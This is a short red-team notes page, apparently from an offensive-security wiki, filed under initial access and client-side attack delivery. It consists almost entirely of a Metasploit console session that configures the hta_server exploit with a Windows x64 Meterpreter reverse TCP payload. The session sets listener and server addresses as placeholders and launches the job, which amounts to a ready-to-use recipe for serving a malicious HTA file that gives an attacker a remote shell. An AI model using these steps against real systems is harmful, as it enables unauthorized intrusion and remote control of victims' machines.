# HTA Web Server

```
msf > use exploit/windows/misc/hta_server

msf exploit(windows/misc/hta_server) > set target 1

msf exploit(windows/misc/hta_server) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/misc/hta_server) > options

Module options (exploit/windows/misc/hta_server):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Powershell x64


msf exploit(windows/misc/hta_server) > set lhost <IP>

msf exploit(windows/misc/hta_server) > set lport <PORT>

msf exploit(windows/misc/hta_server) > set srvhost <server_IP>

msf exploit(windows/misc/hta_server) > set srvport <server_PORT>

msf exploit(windows/misc/hta_server) > run -j
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xD - Client-Side Attacks/Delivery Methods/File Attachment/Web Drive-by/Windows/Manual/Living off the Land]]